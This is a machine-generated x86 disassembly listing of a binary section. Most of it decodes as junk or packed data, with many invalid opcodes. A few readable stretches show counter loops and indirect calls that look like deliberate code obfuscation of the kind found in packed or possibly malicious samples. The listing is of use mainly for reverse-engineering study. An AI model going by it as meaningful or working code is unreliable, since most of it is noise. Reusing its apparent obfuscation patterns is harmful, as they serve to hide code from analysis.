  4140be:	mov    DWORD PTR [edx-0x57c26dd2],esp
  4140c4:	out    0xf1,eax
  4140c6:	ret    
  4140c7:	repz sbb ch,BYTE PTR [edi]
  4140ca:	and    BYTE PTR [ebp+0x56492e75],al
  4140d0:	mov    bh,BYTE PTR [edx+eax*4+0x6c23f7db]
  4140d7:	and    ah,BYTE PTR [esi]
  4140d9:	sub    BYTE PTR ds:0x941075e3,ah
  4140df:	fist   WORD PTR [ebx-0xde90a9]
  4140e5:	imul   esi,DWORD PTR [eax-0x3c],0xffffffba
  4140e9:	cmp    eax,0xb799693d
  4140ee:	repz xor ebx,edx
  4140f1:	inc    edi
  4140f2:	push   ebp
  4140f3:	sub    ebx,eax
  4140f5:	mov    eax,0x365ea5e8
  4140fa:	sbb    eax,0x65b7f696
  4140ff:	iret   
  414100:	stos   BYTE PTR es:[edi],al
  414101:	stos   DWORD PTR es:[edi],eax
  414102:	int    0x46
  414104:	nop
  414105:	stc    
  414106:	in     eax,dx
  414107:	sub    eax,0x4fb5e223
  41410c:	(bad)  
  41410d:	mov    al,0xa4
  41410f:	or     BYTE PTR [edx-0x47],0xa2
  414113:	rol    DWORD PTR [edx],0xd9
  414116:	out    0xda,al
  414118:	adc    BYTE PTR [ebp+0x5e0f1cd0],bh
  41411e:	pusha  
  41411f:	jl     0x414129
  414121:	lock xchg BYTE PTR [ebx],dl
  414124:	mov    ebx,0xf5bf18eb
  414129:	repnz mov DWORD PTR [edx-0x79],ebx
  41412d:	(bad)  
  41412e:	(bad)  
  41412f:	mov    BYTE PTR [ebx-0x56af7bcb],0x43
  414136:	jl     0x4141a7
  414138:	ret    0x3834
  41413b:	sbb    esp,ebx
  41413d:	sbb    al,0x7b
  41413f:	push   ebp
  414140:	(bad)  
  414141:	arpl   WORD PTR [edx],cx
  414143:	cmc    
  414144:	imul   DWORD PTR [eax+0x625f0d7c]
  41414a:	(bad)  
  41414b:	pop    ss
  41414c:	jo     0x4141bc
  41414e:	(bad)  
  41414f:	cmp    al,0xc5
  414151:	xor    al,0x62
  414153:	xor    DWORD PTR [ecx],edx
  414155:	dec    ebx
  414156:	add    al,BYTE PTR [ebx+edi*4+0x30]
  41415a:	push   ss
  41415b:	mov    BYTE PTR ds:0xec458b3e,ah
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414242
  414283:	mov    ah,0x6
  414285:	push   0x70707380
  41428a:	mov    ecx,0xca70707e
  41428f:	(bad)  
  414291:	icebp  
  414292:	pop    ebp
  414293:	add    eax,0xbb6e7910
  414298:	and    esp,DWORD PTR [ebx-0x15]
  41429b:	xchg   ebp,eax
  41429c:	out    0x90,eax
  41429e:	xor    al,0xb4
  4142a0:	pop    ss
  4142a1:	mov    ebx,0x13153600
  4142a6:	jg     0x4142ab
  4142a8:	ret    0x7b92
  4142ab:	jns    0x41423f
  4142ad:	mov    bh,0xb0
  4142af:	ins    DWORD PTR es:[edi],dx
  4142b0:	sbb    dh,ah
  4142b2:	adc    BYTE PTR [esi],ch
  4142b4:	mov    al,ds:0xcb30e38f
  4142b9:	scas   al,BYTE PTR es:[edi]
  4142ba:	jle    0x41425c
  4142bc:	lahf   
  4142bd:	bound  ebp,QWORD PTR [edx+0x440822fc]
  4142c3:	test   BYTE PTR [edi+0x2f333af5],cl
  4142c9:	xor    edx,DWORD PTR [esi-0xe]
  4142cc:	xchg   ebp,eax
  4142cd:	retf   0xc50c
  4142d0:	push   es
  4142d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d2:	jmp    0x2fa3ae80
  4142d7:	sub    ecx,esp
  4142d9:	jp     0x41428c
  4142db:	add    al,0x60
  4142dd:	cdq    
  4142de:	adc    DWORD PTR [ebp-0x16f52b90],ebx
  4142e4:	bnd ret 
  4142e6:	sub    dh,dl
  4142e8:	add    eax,0x77532248
  4142ed:	and    eax,0x8a75d39a
  4142f2:	pop    ecx
  4142f3:	or     BYTE PTR [esi-0x24],bh
  4142f6:	ret    
  4142f7:	(bad)  
  4142f8:	fsubr  QWORD PTR ds:0x8c522fa2
  4142fe:	xor    esp,DWORD PTR [edi]
  414300:	mov    cl,BYTE PTR [eax]
  414302:	mov    edx,0x8d59042e
  414307:	xor    BYTE PTR [eax-0x2ac36ecc],0x4b
  41430e:	dec    eax
  41430f:	into   
  414310:	mov    dh,0x90
  414312:	rdtsc  
  414314:	aam    0x57
  414316:	push   ebp
  414317:	sti    
  414318:	fadd   st(7),st
  41431a:	cmp    BYTE PTR [ecx],cl
  41431c:	xor    DWORD PTR [ebx+0x4d],edi
  41431f:	pop    eax
  414320:	pop    es
  414321:	(bad)  
  414322:	jmp    0xd1d692c
  414327:	sub    eax,0xd2f931aa
  41432c:	push   esp
  41432d:	cdq    
  41432e:	push   es
  41432f:	fnstcw WORD PTR [ecx]
  414331:	js     0x41437b
  414333:	add    BYTE PTR [edi],0xbe
  414336:	std    
  414337:	or     esi,DWORD PTR [ecx]
  414339:	in     al,0xa
  41433b:	cmp    cl,BYTE PTR [edi-0x6490317e]
  414341:	mov    ah,0x36
  414343:	mov    ds:0x42cb271d,eax
  414348:	neg    BYTE PTR [edx+0x5cb9dfc3]
  41434e:	popf   
  41434f:	inc    ebx
  414350:	out    0x46,al
  414352:	pop    esi
  414353:	call   0xb97b:0xe32021e0
  41435a:	mov    edi,DWORD PTR [ebx]
  41435c:	lahf   
  41435d:	dec    edi
  41435e:	sbb    eax,0xfa44459e
  414363:	iret   
  414364:	sbb    al,0x3b
  414366:	fstp   DWORD PTR [ecx+0x24]
  414369:	jae    0x41430d
  41436b:	add    BYTE PTR [esi],cl
  41436d:	jle    0x414332
  41436f:	sub    eax,0x78343084
  414374:	popf   
  414375:	xchg   edx,eax
  414376:	(bad)  
  414377:	rol    BYTE PTR [edi+edi*1-0x310bbf8c],1
  41437e:	loope  0x4143be
  414380:	jb     0x4143d5
  414382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414383:	mov    dh,0x28
  414385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414386:	or     ah,BYTE PTR [eax-0x4ed14e9c]
  41438c:	xchg   DWORD PTR [esp+0x628148e1],ecx
  414393:	lods   al,BYTE PTR ds:[esi]
  414394:	mov    eax,ds:0x739c1078
  414399:	call   0x5a20:0x1d0ba2b1
  4143a0:	or     ebp,ebp
  4143a2:	pop    edx
  4143a3:	arpl   WORD PTR [eax-0x28],bx
  4143a6:	test   BYTE PTR [esi],al
  4143a8:	loope  0x414399
  4143aa:	loope  0x41438d
  4143ac:	stos   DWORD PTR es:[edi],eax
  4143ad:	les    ebp,FWORD PTR [edi+0x245942b9]
  4143b3:	pop    ecx
  4143b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143b5:	mov    eax,0x4cf21cf3
  4143ba:	shr    DWORD PTR [esi-0x63f88067],1
  4143c0:	xor    al,0xf5
  4143c2:	dec    edx
  4143c3:	cmp    eax,0x29343683
  4143c8:	fidiv  WORD PTR [ecx-0x12a490c1]
  4143ce:	jge    0x41437a
  4143d0:	add    DWORD PTR [ebx+ecx*8+0x5d5e2cfb],esi
  4143d7:	stc    
  4143d8:	scas   al,BYTE PTR es:[edi]
  4143d9:	enter  0x8a31,0x12
  4143dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143de:	out    0xd,eax
  4143e0:	xlat   BYTE PTR ds:[ebx]
  4143e1:	xbegin 0xdea1a7d0
  4143e7:	or     al,BYTE PTR [eax-0x61d1efb0]
  4143ed:	xchg   esi,eax
  4143ee:	mov    ds:0x89201cae,al
  4143f3:	bound  eax,QWORD PTR [ecx+ebx*1+0x4d]
  4143f7:	xchg   esp,eax
  4143f8:	shr    BYTE PTR ds:0xb5efe336,cl
  4143fe:	and    eax,0x4c01267f
  414403:	ror    DWORD PTR [edi+ebx*8-0x270ba34c],cl
  41440a:	adc    eax,0x8a9dcd32
  41440f:	out    dx,eax
  414410:	xchg   ebx,eax
  414411:	push   edi
  414412:	sti    
  414413:	repz or al,0xc7
  414416:	mov    al,0x90
  414418:	adc    esi,DWORD PTR [edx]
  41441a:	fcomp  QWORD PTR [edi-0x26]
  41441d:	mov    ?,WORD PTR ds:0x5a058115
  414423:	or     dh,BYTE PTR [eax]
  414425:	mov    cl,0x2f
  414427:	repnz push 0x6a
  41442a:	push   es
  41442b:	test   bh,bh
  41442d:	mov    dl,0xfc
  41442f:	arpl   dx,si
  414431:	dec    ebp
  414432:	xchg   ecx,ebx
  414434:	dec    esi
  414435:	test   DWORD PTR [esi+0x2f],0x3567eb43
  41443c:	shr    BYTE PTR [eax+0x6f87c43c],0x31
  414443:	inc    eax
  414444:	mov    ah,0x36
  414446:	pop    esp
  414447:	icebp  
  414448:	mov    esp,0xc8ab3d58
  41444d:	daa    
  41444e:	sub    DWORD PTR [ebx+ecx*1],ebp
  414451:	and    al,0x2e
  414453:	nop
  414454:	or     ecx,DWORD PTR [ebx-0x3551bb44]
  41445a:	pop    ss
  41445b:	or     BYTE PTR ds:0x709a0f40,ch
  414461:	push   edx
  414462:	push   es
  414463:	(bad)  
  414464:	test   BYTE PTR [edi],0x8e
  414467:	outs   dx,BYTE PTR ds:[esi]
  414468:	mov    ds:0x6aebbeb8,al
  41446d:	xchg   ecx,eax
  41446e:	push   ds
  41446f:	pusha  
  414470:	fs jecxz 0x414483
  414473:	fsubr  QWORD PTR [edx+0x18]
  414476:	outs   dx,DWORD PTR ds:[esi]
  414477:	cmp    BYTE PTR [esi],bl
  414479:	js     0x414413
  41447b:	mov    ds:0x7a9f32d8,al
  414480:	stos   DWORD PTR es:[edi],eax
  414481:	out    0x71,eax
  414483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414484:	test   al,0xf6
  414486:	sti    
  414487:	out    0xfe,eax
  414489:	int    0xf1
  41448b:	aaa    
  41448c:	dec    eax
  41448d:	test   DWORD PTR [edi-0x6235260f],eax
  414493:	out    0x88,eax
  414495:	adc    eax,0xccceff92
  41449a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449b:	fiadd  DWORD PTR [edi]
  41449d:	les    ecx,FWORD PTR [ebp-0x72]
  4144a0:	adc    eax,0xb910412b
  4144a5:	mov    al,ds:0x9d067b33
  4144aa:	jns    0x414503
  4144ac:	fld    QWORD PTR [ecx]
  4144ae:	pop    es
  4144af:	pushf  
  4144b0:	mov    bl,0x75
  4144b2:	bound  edi,QWORD PTR [ecx]
  4144b4:	push   ebx
  4144b5:	aad    0xeb
  4144b7:	cmp    al,0xdd
  4144b9:	fwait
  4144ba:	rcl    cl,cl
  4144bc:	rol    DWORD PTR [esi+0x5e],cl
  4144bf:	addr16 push edx
  4144c1:	jecxz  0x414495
  4144c3:	mov    ch,0x87
  4144c5:	pop    eax
  4144c6:	xchg   esp,eax
  4144c7:	cli    
  4144c8:	jge    0x414548
  4144ca:	adc    al,0xb1
  4144cc:	mov    ebx,DWORD PTR [eax+0x5c5add5e]
  4144d2:	pop    eax
  4144d3:	jb     0x414482
  4144d5:	jmp    DWORD PTR [esi+0x7c2f55a]
  4144db:	and    cl,bl
  4144dd:	and    dh,BYTE PTR gs:[ebp-0x78]
  4144e1:	adc    ebp,DWORD PTR [ecx+0x556dd576]
  4144e7:	rcr    BYTE PTR [ebx+0x79c8cbd7],cl
  4144ed:	stc    
  4144ee:	ret    
  4144ef:	sub    dl,ah
  4144f1:	pop    ss
  4144f2:	mov    eax,0xba536d99
  4144f7:	stc    
  4144f8:	dec    DWORD PTR [esi+0x44813ec0]
  4144fe:	xchg   ebx,eax
  4144ff:	jne    0x414485
  414501:	jge    0x4144dd
  414503:	test   eax,0xadac282f
  414508:	aaa    
  414509:	adc    ch,bl
  41450b:	or     ecx,DWORD PTR [edx+0x17f2f593]
  414511:	(bad)  
  414512:	(bad)  
  414513:	leave  
  414514:	xchg   edx,eax
  414515:	or     DWORD PTR [ebx+0x35],ebp
  414518:	ffreep st(7)
  41451a:	data16 jl 0x4144f2
  41451d:	data16 (bad) 
  41451f:	retf   
  414520:	sar    BYTE PTR [edx-0x63],0xc8
  414524:	and    BYTE PTR [eax+0x602b2c13],ah
  41452a:	outs   dx,BYTE PTR ds:[esi]
  41452b:	push   esp
  41452c:	adc    bh,BYTE PTR [ebp+0x2aca151f]
  414532:	jecxz  0x4144f7
  414534:	jl     0x4144b9
  414536:	int    0x87
  414538:	cmp    al,0xfb
  41453a:	jecxz  0x414565
  41453c:	mov    ch,0x8f
  41453e:	jb     0x414532
  414540:	repz sub eax,0x725fb4cc
  414546:	shr    BYTE PTR [ebp-0x40],cl
  414549:	outs   dx,BYTE PTR ds:[esi]
  41454a:	sbb    eax,0x74a65114
  41454f:	sub    ecx,DWORD PTR [ebx]
  414551:	pop    eax
  414552:	retf   
  414553:	repnz push DWORD PTR gs:[ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xfb18beb4
  414576:	push   0xffffffef
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414545
  414581:	push   0xe937c11d
  414586:	ds lahf 
  414588:	adc    eax,0xc85fea16
  41458d:	lods   al,BYTE PTR ds:[esi]
  41458e:	cmc    
  41458f:	sub    al,cl
  414591:	imul   ebp,DWORD PTR [ecx-0x6b],0x14
  414595:	les    eax,FWORD PTR [ecx-0x1b1b05d]
  41459b:	sbb    eax,0xbd4719cd
  4145a0:	(bad)  
  4145a1:	sub    eax,0xf7ea1aa6
  4145a6:	pop    eax
  4145a7:	xchg   esp,eax
  4145a8:	jge    0x414556
  4145aa:	cmp    DWORD PTR [ebx-0x15e9f913],edx
  4145b0:	mov    BYTE PTR [edi-0x36],ch
  4145b3:	or     al,0xe9
  4145b5:	mov    eax,0x49ad36dd
  4145ba:	jbe    0x4145d1
  4145bc:	in     al,0x2d
  4145be:	icebp  
  4145bf:	mov    ah,0xec
  4145c1:	mov    esp,0xb046f21a
  4145c6:	ficom  WORD PTR [eax+edx*8]
  4145c9:	push   0x28dc581c
  4145ce:	mov    WORD PTR [esi],es
  4145d0:	(bad)  
  4145d2:	add    eax,DWORD PTR [edx]
  4145d4:	sub    al,0xc1
  4145d6:	push   esi
  4145d7:	dec    edx
  4145d8:	(bad)  
  4145d9:	popf   
  4145da:	mov    esi,0xbe3be616
  4145df:	xchg   ebx,eax
  4145e0:	fsubr  DWORD PTR [edx-0x1e]
  4145e3:	lock jge 0x41462e
  4145e6:	push   ds
  4145e7:	and    BYTE PTR [esp+edi*2-0x33],ah
  4145eb:	adc    eax,0x8c905b6
  4145f0:	mov    ds:0x17fc9e0c,eax
  4145f5:	pop    es
  4145f6:	mov    esp,0xe0a7f524
  4145fb:	dec    edx
  4145fc:	scas   eax,DWORD PTR es:[edi]
  4145fd:	xor    DWORD PTR [edi-0x3f39a2af],ebx
  414603:	jmp    0x414663
  414605:	xchg   BYTE PTR [ebx+0x463122c0],al
  41460b:	jae    0x41465c
  41460d:	mov    bh,0xcd
  41460f:	loop   0x41466a
  414611:	jle    0x41459e
  414613:	sub    esp,DWORD PTR [edx+0x439f145b]
  414619:	stc    
  41461a:	call   0xb41150ae
  41461f:	dec    edx
  414620:	add    ch,bh
  414622:	gs jno 0x414671
  414625:	aad    0x3b
  414627:	cmc    
  414628:	mov    bl,0x97
  41462a:	pop    ecx
  41462b:	shr    DWORD PTR [ebp+0x57551855],0xb0
  414632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414633:	stos   BYTE PTR es:[edi],al
  414634:	and    ebp,ebp
  414636:	xor    BYTE PTR cs:[ecx],cl
  414639:	outs   dx,DWORD PTR ds:[esi]
  41463a:	add    BYTE PTR [edi],0xdd
  41463d:	addr16 into 
  41463f:	jmp    0x5b86:0x3ec6d2d3
  414646:	gs addr16 jl 0x41468a
  41464a:	ret    
  41464b:	dec    eax
  41464c:	inc    esp
  41464d:	arpl   WORD PTR ss:[ebx+ebp*8+0x36888e63],bx
  414655:	inc    edx
  414656:	xchg   edi,eax
  414657:	or     BYTE PTR [ecx+0x54],al
  41465a:	(bad)  
  41465b:	mov    dl,0xf5
  41465d:	cdq    
  41465e:	stc    
  41465f:	popa   
  414660:	xor    eax,0x975d39
  414665:	push   ds
  414666:	push   ebp
  414667:	stos   DWORD PTR es:[edi],eax
  414668:	je     0x414690
  41466a:	sar    ebx,cl
  41466c:	fcmovnu st,st(6)
  41466e:	push   edi
  41466f:	aam    0x4
  414671:	xchg   esi,eax
  414672:	out    dx,eax
  414673:	and    ebp,esp
  414675:	retf   
  414676:	mov    ebx,0x1fe57bc4
  41467b:	inc    eax
  41467c:	aas    
  41467d:	cmp    eax,0xa15ffdb6
  414682:	ror    BYTE PTR [edi],cl
  414684:	push   ebp
  414685:	cmp    eax,0x8ece5911
  41468a:	mov    fs,WORD PTR [edi-0x4a0083d0]
  414690:	retf   
  414691:	cmp    DWORD PTR es:[edi+0x38960c3c],esi
  414698:	out    0x73,eax
  41469a:	cmp    ecx,DWORD PTR [edx+0x6e]
  41469d:	shl    DWORD PTR [ecx+0x437f0921],cl
  4146a3:	call   0x1c43894
  4146a8:	mov    edi,0x613d4983
  4146ad:	jmp    0x6b40:0x267d1db0
  4146b4:	pop    ebp
  4146b5:	push   ecx
  4146b6:	outs   dx,DWORD PTR ds:[esi]
  4146b7:	sub    al,0xb7
  4146b9:	inc    BYTE PTR [ebp-0x18004bac]
  4146bf:	out    dx,eax
  4146c0:	mov    ds:0x325d3508,eax
  4146c5:	lds    esi,FWORD PTR [esi+0x58]
  4146c8:	add    al,0xa9
  4146ca:	and    ah,bh
  4146cc:	dec    esi
  4146cd:	xchg   DWORD PTR [ebx],eax
  4146cf:	xchg   DWORD PTR [ecx+0x33],eax
  4146d2:	pop    ds
  4146d3:	bound  eax,QWORD PTR [esi+0x7a]
  4146d6:	or     edi,edx
  4146d8:	xchg   ebp,eax
  4146d9:	cli    
  4146da:	pop    ebp
  4146db:	ins    BYTE PTR es:[edi],dx
  4146dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146dd:	fidiv  WORD PTR [edi-0x5f]
  4146e0:	test   BYTE PTR [eax-0x5f],0xe6
  4146e4:	das    
  4146e5:	adc    bh,BYTE PTR [edx-0x26]
  4146e8:	push   eax
  4146e9:	int    0xeb
  4146eb:	cmp    ch,0xfc
  4146ee:	cmp    bh,BYTE PTR ds:0x2c334bb5
  4146f4:	mov    ch,0xcd
  4146f6:	ds (bad) 
  4146f8:	and    esi,eax
  4146fa:	icebp  
  4146fb:	ret    
  4146fc:	mov    ch,0x42
  4146fe:	mov    es,WORD PTR [ebx-0x6f]
  414701:	xchg   edi,eax
  414702:	and    dh,ah
  414704:	test   al,0xab
  414706:	cmp    ch,BYTE PTR [esi+0x2a]
  414709:	sub    al,0x84
  41470b:	and    ecx,DWORD PTR [ecx+0x2a1f6642]
  414711:	push   ebp
  414712:	pop    ds
  414713:	xchg   ebp,eax
  414714:	out    dx,eax
  414715:	jge    0x4146d3
  414717:	inc    edi
  414718:	imul   ecx,ecx,0x46
  41471b:	lea    ebp,[ebx+0x22]
  41471e:	and    ebp,DWORD PTR [edx+0x5b65c314]
  414724:	outs   dx,BYTE PTR ds:[esi]
  414725:	aad    0x7d
  414727:	jecxz  0x4147a5
  414729:	icebp  
  41472a:	inc    ebp
  41472b:	push   ecx
  41472c:	out    0x21,al
  41472e:	mov    esi,0x59a8d226
  414733:	jp     0x4146fd
  414735:	ins    BYTE PTR es:[edi],dx
  414736:	pop    edx
  414737:	push   eax
  414738:	and    edi,DWORD PTR ds:0x95e735fd
  41473e:	mov    BYTE PTR [ebp+0x65],bl
  414741:	(bad)  
  414742:	ror    DWORD PTR [esi],1
  414744:	repnz add ebp,DWORD PTR [esi-0x3df0e5c0]
  41474b:	fldcw  WORD PTR [edi-0x4d67a34c]
  414751:	push   0xffffffab
  414753:	sub    BYTE PTR [edx*1-0x247c16d6],ah
  41475a:	out    0xda,al
  41475c:	add    ebp,DWORD PTR [ebp+0x22]
  41475f:	(bad)  
  414760:	inc    ebp
  414761:	add    esi,DWORD PTR [ecx+0x48]
  414764:	call   0x743c:0x90fa7044
  41476b:	sahf   
  41476c:	nop
  41476d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41476e:	sbb    cl,0xc3
  414771:	sbb    esp,esp
  414773:	mov    esi,0x2d779c7f
  414778:	mov    ah,0x8d
  41477a:	das    
  41477b:	mov    dh,0x6e
  41477d:	int    0x8a
  41477f:	popf   
  414780:	add    BYTE PTR [edi-0x4a],bh
  414783:	pop    eax
  414784:	cmp    eax,0xb515c532
  414789:	sub    ch,BYTE PTR ds:0x1c9b02e4
  41478f:	mov    edx,0xfeb6059c
  414794:	jbe    0x41479c
  414796:	cmp    al,0xea
  414798:	(bad)  
  41479a:	lahf   
  41479b:	or     DWORD PTR [edi],ecx
  41479d:	inc    esp
  41479e:	add    DWORD PTR [ebx+0x785b7e63],eax
  4147a4:	mov    bl,0xc
  4147a6:	call   0x3f0fb200
  4147ab:	and    eax,0x55221fbd
  4147b0:	mov    al,ds:0xac1c2657
  4147b5:	data16 add bl,bh
  4147b8:	jmp    0x4147e6
  4147ba:	mov    ah,0x67
  4147bc:	adc    cl,BYTE PTR ds:0xc36ae357
  4147c2:	es (bad) 
  4147c4:	mov    ch,0x98
  4147c6:	cli    
  4147c7:	out    dx,eax
  4147c8:	xlat   BYTE PTR ds:[ebx]
  4147c9:	mov    ebx,0xe0612d68
  4147ce:	(bad)  
  4147cf:	popf   
  4147d0:	es aam 0x1
  4147d3:	int3   
  4147d4:	out    0xfd,al
  4147d6:	cmp    BYTE PTR [ebx-0x2c],dl
  4147d9:	ja     0x4147f3
  4147db:	sbb    eax,DWORD PTR [ebp+0x731e6641]
  4147e1:	pop    esi
  4147e2:	jecxz  0x414784
  4147e4:	stos   DWORD PTR es:[edi],eax
  4147e5:	mov    eax,ds:0xc0d93a6d
  4147ea:	frstor [ecx]
  4147ec:	add    al,0xd2
  4147ee:	int    0x80
  4147f0:	cli    
  4147f1:	into   
  4147f2:	mov    edi,0x98647585
  4147f7:	xchg   ecx,eax
  4147f8:	push   cs
  4147f9:	push   0x3fde3b63
  4147fe:	xor    al,BYTE PTR [edx]
  414800:	xor    BYTE PTR [esi],0xa1
  414803:	out    dx,eax
  414804:	js     0x41479d
  414806:	or     al,0x9f
  414808:	xchg   ebx,eax
  414809:	sti    
  41480a:	and    ecx,DWORD PTR [edi]
  41480c:	popf   
  41480d:	sub    eax,0x50b31a40
  414812:	retf   0x141a
  414815:	mov    al,ds:0x387e78c4
  41481a:	jmp    0xc5432426
  41481f:	xor    al,0xa2
  414821:	rcr    DWORD PTR [eax-0x4e],0x28
  414825:	cmp    BYTE PTR [ecx+0x72],0x2f
  414829:	jnp    0x4147f1
  41482b:	mov    edi,0xa547c6b7
  414830:	push   ds
  414831:	sub    eax,0x95ba221c
  414836:	xor    edx,ebp
  414838:	out    0x61,al
  41483a:	push   ss
  41483b:	imul   esi,ecx,0x21f8e7c0
  414841:	xchg   esi,eax
  414842:	loop   0x414889
  414844:	cmp    BYTE PTR [ecx-0x7b274ef],bl
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414804
  414861:	xor    BYTE PTR [ebx+0x1b],dh
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148e0
  41486d:	pop    edi
  41486e:	xchg   ch,dl
  414870:	push   esi
  414871:	int3   
  414872:	jb     0x41488e
  414874:	cmp    cl,bh
  414876:	aad    0x97
  414878:	cmc    
  414879:	repz pop ds
  41487b:	fsubr  DWORD PTR [ecx-0x3c9c2a51]
  414881:	stos   BYTE PTR es:[edi],al
  414882:	ds je  0x41489e
  414885:	xor    BYTE PTR [ebp+eiz*4-0x36],0xf1
  41488a:	sub    al,0x2
  41488c:	dec    ecx
  41488d:	popa   
  41488e:	add    eax,0x3a673a7c
  414893:	out    dx,eax
  414894:	popa   
  414895:	jl     0x414842
  414897:	push   edi
  414898:	jecxz  0x41488b
  41489a:	out    dx,eax
  41489b:	xchg   edi,eax
  41489c:	push   ebx
  41489d:	add    al,0xcf
  41489f:	repnz adc ebp,esi
  4148a2:	(bad)  
  4148a3:	(bad)  [ebx]
  4148a5:	(bad)  
  4148a6:	fld    TBYTE PTR ds:0xff8758ce
  4148ac:	push   0x45
  4148ae:	lock stos BYTE PTR es:[edi],al
  4148b0:	sbb    ah,al
  4148b2:	push   ecx
  4148b3:	hlt    
  4148b4:	retf   0x95be
  4148b7:	cwde   
  4148b8:	imul   DWORD PTR [edx+0x7dd78e93]
  4148be:	pop    edx
  4148bf:	test   BYTE PTR [esi-0x11],0x68
  4148c3:	pop    es
  4148c4:	and    al,0xb6
  4148c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c7:	into   
  4148c8:	inc    esi
  4148c9:	cmp    ah,BYTE PTR [ecx]
  4148cb:	sbb    DWORD PTR [esi],esp
  4148cd:	adc    eax,DWORD PTR [edx+0x30ab55b]
  4148d3:	call   0xffc66fc9
  4148d8:	push   es
  4148d9:	mov    edx,0xd1fbb20a
  4148de:	cmp    ah,dl
  4148e0:	or     al,0x4f
  4148e2:	mov    bh,0x9b
  4148e4:	pop    ds
  4148e5:	test   eax,0xcf5b155a
  4148ea:	xor    ch,BYTE PTR [edi-0x3cc75192]
  4148f0:	int3   
  4148f1:	cdq    
  4148f2:	cs je  0x41496d
  4148f5:	out    0xf7,al
  4148f7:	int    0xbc
  4148f9:	lahf   
  4148fa:	inc    ebx
  4148fb:	pop    es
  4148fc:	pop    esi
  4148fd:	or     ch,bl
  4148ff:	call   0xc4784d06
  414904:	jecxz  0x4148a0
  414906:	aas    
  414907:	cmp    al,0xb7
  414909:	sbb    edx,DWORD PTR [eax-0x6d5a01aa]
  41490f:	mov    bh,bh
  414911:	cmc    
  414912:	mov    al,0x2e
  414914:	and    cl,BYTE PTR [ebx]
  414916:	lods   eax,DWORD PTR ds:[esi]
  414917:	stos   DWORD PTR es:[edi],eax
  414918:	inc    eax
  414919:	lock adc al,0xcc
  41491c:	repz repz xchg ah,dl
  414920:	int    0xbd
